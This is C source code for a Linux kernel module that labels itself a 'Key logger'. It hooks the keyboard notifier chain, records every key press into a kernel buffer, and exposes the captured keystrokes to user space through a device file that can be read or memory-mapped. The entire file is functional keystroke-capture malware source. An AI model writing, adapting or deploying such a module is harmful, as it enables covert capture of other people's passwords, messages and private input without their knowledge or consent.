#include "../HEADERS/Kernel_module.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("OL");
MODULE_DESCRIPTION("Key logger");

int buffer[BUFFER_SIZE];
int buffer_pos = 0;

struct notifier_block nb;
struct semaphore sem;

int keylogger_open(struct inode *inode, struct file *file) 
{
	return 0;
}

int keylogger_release(struct inode *inode, struct file *file) 
{
	return 0;
}

ssize_t keylogger_read(struct file *file, char __user *buf, size_t count, loff_t *ppos) 
{
	int bytes_read;

	if (down_interruptible(&sem))
		return -ERESTARTSYS;

	// Check if there is data to read
	if (buffer_pos == 0) {
		up(&sem);
		return 0; // No data to read
	}

	// Calculate the number of bytes to read
	if (*ppos + count > buffer_pos)
		count = buffer_pos - *ppos;

	// Copy data from the kernel space buffer to user space
	if (copy_to_user(buf, buffer + *ppos, count)) {
		up(&sem);
		return -EFAULT;
	}

	// Update the read position
	*ppos += count;
	bytes_read = count;

	// If the buffer has been read completely, reset buffer_pos
	if (*ppos >= buffer_pos) {
		buffer_pos = 0;
		*ppos = 0;
	}

	up(&sem);

	return bytes_read;
}

int keylogger_mmap(struct file *filp, struct vm_area_struct *vma) 
{
	unsigned long pfn = virt_to_phys(buffer) >> PAGE_SHIFT;
	unsigned long size = vma->vm_end - vma->vm_start;

	if (size > BUFFER_SIZE)
		return -EINVAL;

	if (remap_pfn_range(vma, vma->vm_start, pfn, size, vma->vm_page_prot))
		return -EAGAIN;

	return 0;
}

struct file_operations keylogger_fops = 
{
	.owner = THIS_MODULE,
	.open = keylogger_open,
	.release = keylogger_release,
	.read = keylogger_read,
	.mmap = keylogger_mmap,
};

struct miscdevice keylog_device = {
	.minor = MISC_DYNAMIC_MINOR,
	.name = DEVICE_NAME,
	.fops = &keylogger_fops,
};

int keylogger_notify(struct notifier_block *nb, unsigned long action, void *data) 
{
	struct keyboard_notifier_param *param = data;

	if (action == KBD_KEYSYM && param->down) 
	{
		if (down_interruptible(&sem))
			return NOTIFY_BAD;

		buffer[buffer_pos] = param->value;
		buffer_pos = (buffer_pos + 1) % BUFFER_SIZE;

		up(&sem);
	}

	return NOTIFY_OK;
}

static int __init keylogger_init(void) 
{
	int ret;

	sema_init(&sem, 1);

	nb.notifier_call = keylogger_notify;
	ret = register_keyboard_notifier(&nb);

	if (ret) {
		return ret;
	}

	ret = misc_register(&keylog_device);

	if (ret) {
		unregister_keyboard_notifier(&nb);
		return ret;
	}

	printk(KERN_INFO "Keylogger module loaded\n");
	return 0;
}

static void __exit keylogger_exit(void) 
{
	misc_deregister(&keylog_device);
	unregister_keyboard_notifier(&nb);
	printk(KERN_INFO "Keylogger module unloaded\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

